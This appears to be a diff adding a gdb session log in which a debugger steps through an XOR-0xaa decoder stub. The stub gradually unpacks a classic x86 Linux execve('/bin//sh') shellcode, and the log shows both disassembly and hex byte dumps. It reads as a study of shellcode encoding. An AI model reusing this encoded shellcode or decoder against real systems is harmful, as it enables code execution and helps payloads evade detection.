+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x7369622f
+   0x0804a071 <+49>:    stos   BYTE PTR es:[edi],al
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0x2f    0x62    0x69    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb) c
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x6e69622f
+   0x0804a071 <+49>:    stos   BYTE PTR es:[edi],al
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0x2f    0x62    0x69    0x6e    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb) c
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x6e69622f
+   0x0804a071 <+49>:    mov    DWORD PTR [eax-0x56],ebp
+   0x0804a074 <+52>:    push   0x62aa2faa
+   0x0804a079 <+57>:    stos   BYTE PTR es:[edi],al
+   0x0804a07a <+58>:    imul   ebp,DWORD PTR [edx-0x55765592],0xaa50aae3
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0x2f    0x62    0x69    0x6e    0x89    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb) c
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x6e69622f
+   0x0804a071 <+49>:    mov    ebx,esp
+   0x0804a073 <+51>:    stos   BYTE PTR es:[edi],al
+   0x0804a074 <+52>:    push   0x62aa2faa
+   0x0804a079 <+57>:    stos   BYTE PTR es:[edi],al
+   0x0804a07a <+58>:    imul   ebp,DWORD PTR [edx-0x55765592],0xaa50aae3
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb) c
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x6e69622f
+   0x0804a071 <+49>:    mov    ebx,esp
+   0x0804a073 <+51>:    push   eax
+   0x0804a074 <+52>:    push   0x62aa2faa
+   0x0804a079 <+57>:    stos   BYTE PTR es:[edi],al
+   0x0804a07a <+58>:    imul   ebp,DWORD PTR [edx-0x55765592],0xaa50aae3
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb) c
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x6e69622f
+   0x0804a071 <+49>:    mov    ebx,esp
+   0x0804a073 <+51>:    push   eax
+   0x0804a074 <+52>:    mov    DWORD PTR [edx-0x559d55d1],ebp
+   0x0804a07a <+58>:    imul   ebp,DWORD PTR [edx-0x55765592],0xaa50aae3
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
+0x804a074 <code+52>:    0x89    0xaa    0x2f    0xaa
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb) c
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x6e69622f
+   0x0804a071 <+49>:    mov    ebx,esp
+   0x0804a073 <+51>:    push   eax
+   0x0804a074 <+52>:    mov    edx,esp
+   0x0804a076 <+54>:    das
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
+0x804a074 <code+52>:    0x89    0xe2    0x2f    0xaa
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb) c
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x6e69622f
+   0x0804a071 <+49>:    mov    ebx,esp
+   0x0804a073 <+51>:    push   eax
+   0x0804a074 <+52>:    mov    edx,esp
+   0x0804a076 <+54>:    push   ebx
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
+0x804a074 <code+52>:    0x89    0xe2    0x53    0xaa
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb) c
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x6e69622f
+   0x0804a071 <+49>:    mov    ebx,esp
+   0x0804a073 <+51>:    push   eax
+   0x0804a074 <+52>:    mov    edx,esp
+   0x0804a076 <+54>:    push   ebx
+   0x0804a077 <+55>:    mov    DWORD PTR [edx-0x56],esp
+   0x0804a07a <+58>:    imul   ebp,DWORD PTR [edx-0x55765592],0xaa50aae3
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
+0x804a074 <code+52>:    0x89    0xe2    0x53    0x89
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb) x/5i 0x804a064
+   0x804a064 <code+36>: xor    eax,eax
+   0x804a066 <code+38>: push   eax
+   0x804a067 <code+39>: push   0x68732f2f
+   0x804a06c <code+44>: push   0x6e69622f
+   0x804a071 <code+49>: mov    ebx,esp
+(gdb) c
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x6e69622f
+   0x0804a071 <+49>:    mov    ebx,esp
+   0x0804a073 <+51>:    push   eax
+   0x0804a074 <+52>:    mov    edx,esp
+   0x0804a076 <+54>:    push   ebx
+   0x0804a077 <+55>:    mov    ecx,esp
+   0x0804a079 <+57>:    stos   BYTE PTR es:[edi],al
+   0x0804a07a <+58>:    imul   ebp,DWORD PTR [edx-0x55765592],0xaa50aae3
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
+0x804a074 <code+52>:    0x89    0xe2    0x53    0x89
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb)
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x6e69622f
+   0x0804a071 <+49>:    mov    ebx,esp
+   0x0804a073 <+51>:    push   eax
+   0x0804a074 <+52>:    mov    edx,esp
+   0x0804a076 <+54>:    push   ebx
+   0x0804a077 <+55>:    mov    ecx,esp
+   0x0804a079 <+57>:    mov    al,0x69
+   0x0804a07b <+59>:    stos   BYTE PTR es:[edi],al
+   0x0804a07c <+60>:    outs   dx,BYTE PTR ds:[esi]
+   0x0804a07d <+61>:    stos   BYTE PTR es:[edi],al
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
+0x804a074 <code+52>:    0x89    0xe2    0x53    0x89
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb)
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x6e69622f
+   0x0804a071 <+49>:    mov    ebx,esp
+   0x0804a073 <+51>:    push   eax
+   0x0804a074 <+52>:    mov    edx,esp
+   0x0804a076 <+54>:    push   ebx
+   0x0804a077 <+55>:    mov    ecx,esp
+   0x0804a079 <+57>:    mov    al,0xb
+   0x0804a07b <+59>:    stos   BYTE PTR es:[edi],al
+   0x0804a07c <+60>:    outs   dx,BYTE PTR ds:[esi]
+   0x0804a07d <+61>:    stos   BYTE PTR es:[edi],al
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
+0x804a074 <code+52>:    0x89    0xe2    0x53    0x89
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb)
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x6e69622f
+   0x0804a071 <+49>:    mov    ebx,esp
+   0x0804a073 <+51>:    push   eax
+   0x0804a074 <+52>:    mov    edx,esp
+   0x0804a076 <+54>:    push   ebx
+   0x0804a077 <+55>:    mov    ecx,esp
+   0x0804a079 <+57>:    mov    al,0xb
+   0x0804a07b <+59>:    int    0x6e
+   0x0804a07d <+61>:    stos   BYTE PTR es:[edi],al
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
+0x804a074 <code+52>:    0x89    0xe2    0x53    0x89
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb)
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    push   0x68732f2f
+   0x0804a06c <+44>:    push   0x6e69622f
+   0x0804a071 <+49>:    mov    ebx,esp
+   0x0804a073 <+51>:    push   eax
+   0x0804a074 <+52>:    mov    edx,esp
+   0x0804a076 <+54>:    push   ebx
+   0x0804a077 <+55>:    mov    ecx,esp
+   0x0804a079 <+57>:    mov    al,0xb
+   0x0804a07b <+59>:    int    0x80
+   0x0804a07d <+61>:    stos   BYTE PTR es:[edi],al
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a06c <code+44>:    0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
+0x804a074 <code+52>:    0x89    0xe2    0x53    0x89
+
+Breakpoint 3, 0x0804a05a in code ()
+(gdb)
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
